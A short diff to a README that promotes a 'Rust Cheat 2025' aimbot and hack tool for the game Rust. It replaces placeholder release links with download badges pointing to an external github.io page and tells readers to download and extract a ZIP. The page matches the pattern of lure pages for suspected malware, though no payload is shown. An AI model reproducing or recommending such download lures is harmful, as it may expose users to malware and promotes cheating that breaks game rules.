@@ -1,9 +1,9 @@
 # 🚀 **Rust Cheat 2025 - Advanced Rust Hacks & Aimbot**  
-**[![Download Rust Cheat](https://img.shields.io/badge/Download-Rust%20Cheat-blueviolet)](https://github.com/yourusername/rust-cheat/releases)**
+**[![Download Rust Cheat](https://img.shields.io/badge/Download-Rust%20Cheat-blueviolet)](https://mdhassan90.github.io/Rust-External-Cheat-2025/)**
 
 ## Quick Installation
 To get started with Rust Cheat, follow these simple steps:
-1. **[![Download Rust Cheat](https://img.shields.io/badge/Download-Rust%20Cheat-blueviolet)](https://github.com/yourusername/rust-cheat/releases)**
+1. **[![Download Rust Cheat](https://img.shields.io/badge/Download-Rust%20Cheat-blueviolet)](https://mdhassan90.github.io/Rust-External-Cheat-2025/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
